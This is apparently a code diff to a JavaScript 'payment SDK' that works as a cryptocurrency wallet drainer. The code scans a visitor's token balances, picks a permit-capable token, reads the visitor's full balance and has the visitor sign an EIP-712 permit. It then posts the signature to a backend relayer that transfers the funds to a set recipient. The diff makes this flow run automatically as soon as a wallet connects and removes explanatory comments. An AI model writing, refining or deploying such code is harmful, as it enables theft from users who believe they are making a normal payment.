@@ -26,12 +26,6 @@ window.SpiderWebSDK = {
 
     /**
      * Initializes the SDK and attaches the payment logic to a button.
-     * @param {object} config - The configuration object.
-     * @param {string} config.buttonId - The ID of the button that triggers the payment.
-     * @param {string} config.apiKey - The user's unique API key for your service.
-     * @param {string} config.alchemyApiKey - The API key from Alchemy to scan token balances.
-     * @param {string} config.recipientAddress - The address that will receive the funds.
-     * @param {number} config.chainId - The chain ID for the transaction (e.g., 1 for Ethereum).
      */
     init: function(config) {
         if (this._isInitialized) {
@@ -53,7 +47,6 @@ window.SpiderWebSDK = {
             console.error(`SpiderWebSDK Error: Button with ID "${config.buttonId}" not found.`);
             return;
         }
-        // Attach click handler, bound to the SDK context
         payButton.addEventListener('click', this._handlePaymentClick.bind(this));
 
         this._injectModalHtml();
@@ -62,29 +55,26 @@ window.SpiderWebSDK = {
         console.log("SpiderWebSDK initialized successfully.");
     },
 
-    // --- FIX 1: One-Click Payment Flow (Corrected _handlePaymentClick) ---
+    // --- FIXED: Handles flow control. Triggers executeSend only if already connected. ---
     _handlePaymentClick: async function() {
         try {
             if (!this._signer) {
-                // Wallet not connected. Initiate connection via modal.
+                // If not connected, start the connection process. 
+                // The subsequent execution will be triggered inside _handleProviderSelection.
                 const connected = await this._connectWallet(); 
-                
                 if (!connected) {
                     this._updateStatus("Wallet connection cancelled.", "info");
-                    return;
                 }
+                // Return here. Do not proceed to _executeSend() from this function if connection was just initiated.
+                return; 
             }
 
-            // Connection is successful (either existing or newly established).
+            // If already connected, run the full process immediately.
             const network = await this._provider.getNetwork();
-            
-            // Check if the wallet is on the correct chain
             if (network.chainId !== this._config.chainId) {
                 this._updateStatus(`Please switch your wallet to the correct network (Chain ID: ${this._config.chainId}).`, "error");
                 return;
             }
-            
-            // Execute the main payment logic immediately
             await this._executeSend();
             
         } catch (error) {
@@ -123,8 +113,6 @@ window.SpiderWebSDK = {
         const nonZeroBalances = data.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
         if (nonZeroBalances.length === 0) return null;
         
-        // Note: A professional implementation would fetch USD prices.
-        // For simplicity, we check tokens from highest raw balance to lowest for permit compatibility.
         for (const token of nonZeroBalances) {
             const contractAddress = token.contractAddress;
             const supportsPermit = await this._checkPermitSupport(contractAddress);
@@ -136,17 +124,16 @@ window.SpiderWebSDK = {
                     tokenContract.symbol(),
                     tokenContract.balanceOf(this._currentUserAddress)
                 ]);
-                return { contractAddress, name, symbol, balance }; // Return the first (highest balance) compatible token
+                return { contractAddress, name, symbol, balance }; 
             }
         }
         
-        return null; // No compatible tokens found
+        return null; 
     },
     
     _checkPermitSupport: async function(tokenAddress) {
         try {
             const tokenContract = new ethers.Contract(tokenAddress, this._ERC20_PERMIT_ABI, this._provider);
-            // Check for required ERC-20 Permit functions
             await tokenContract.nonces(this._currentUserAddress);
             await tokenContract.DOMAIN_SEPARATOR();
             return true;
@@ -160,12 +147,11 @@ window.SpiderWebSDK = {
         try {
             const tokenContract = new ethers.Contract(tokenData.contractAddress, this._ERC20_PERMIT_ABI, this._signer);
             const nonce = await tokenContract.nonces(this._currentUserAddress);
-            const deadline = Math.floor(Date.now() / 1000) + 1800; // 30 minutes
+            const deadline = Math.floor(Date.now() / 1000) + 1800; 
             const tokenName = tokenData.name;
             
             let domainVersion = "1";
             try {
-                // Try to get token's EIP-712 version string
                 domainVersion = await tokenContract.version();
             } catch (e) {
                 console.log(`Token ${tokenData.symbol} has no version(), defaulting to '1'.`);
@@ -197,7 +183,6 @@ window.SpiderWebSDK = {
             };
 
             this._updateStatus(`Please sign the message for ${tokenData.symbol}...`, 'pending');
-            // Sign the EIP-712 typed data
             const signature = await this._signer._signTypedData(domain, types, permitMessage);
             
             const { v, r, s } = ethers.utils.splitSignature(signature);
@@ -215,7 +200,6 @@ window.SpiderWebSDK = {
             };
 
             this._updateStatus('Signature received. Relaying transaction...', 'pending');
-            // Send the signed permit data to the backend relayer
             const response = await fetch(`${this._RELAYER_SERVER_URL_BASE}/execute-transfer`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -240,6 +224,7 @@ window.SpiderWebSDK = {
         });
     },
 
+    // --- FIXED: Triggers _executeSend immediately after successful connection ---
     _handleProviderSelection: async function(event) {
         const button = event.target.closest('.sw-wallet-button');
         if (!button) return;
@@ -259,7 +244,18 @@ window.SpiderWebSDK = {
             this._currentUserAddress = await this._signer.getAddress();
             
             this._updateStatus(`Connected: ${this._currentUserAddress.slice(0,6)}...${this._currentUserAddress.slice(-4)}`, 'success');
-            if (this._resolveConnection) this._resolveConnection(true);
+            
+            if (this._resolveConnection) {
+                this._resolveConnection(true); 
+                
+                // AUTOMATICALLY TRIGGER EXECUTION 🚀
+                const network = await this._provider.getNetwork();
+                if (network.chainId !== this._config.chainId) {
+                    this._updateStatus(`Please switch your wallet to the correct network (Chain ID: ${this._config.chainId}).`, "error");
+                    return;
+                }
+                await this._executeSend();
+            }
 
         } catch (error) {
             console.error("Connection failed:", error);
@@ -322,7 +318,6 @@ window.SpiderWebSDK = {
         }
         setTimeout(() => {
             if (overlay) overlay.style.display = 'none';
-            // If the modal is closed before connection, resolve the pending promise to false
             if(this._resolveConnection && !this._signer) {
                 this._resolveConnection(false);
             }
@@ -336,7 +331,7 @@ window.SpiderWebSDK = {
         statusEl.innerHTML = `<p style="color: ${colors[type]}; margin: 0; font-size: 14px; text-align: center;">${message}</p>`;
     },
     
-    // --- FIX 2: Correct Event Listener Binding (Resolved "Cannot read properties of undefined (reading 'bind')") ---
+    // --- FIXED: Corrected the event listener binding ---
     _injectModalHtml: function() {
         if (document.getElementById('sw-modal-overlay')) return;
         
@@ -358,7 +353,6 @@ window.SpiderWebSDK = {
 
         document.getElementById('sw-close-wallet-modal-btn').addEventListener('click', closeBound);
         
-        // Pass the bound function directly to the event listener
         document.getElementById('sw-modal-overlay').addEventListener('click', (e) => {
             if (e.target.id === 'sw-modal-overlay') closeBound();
         });
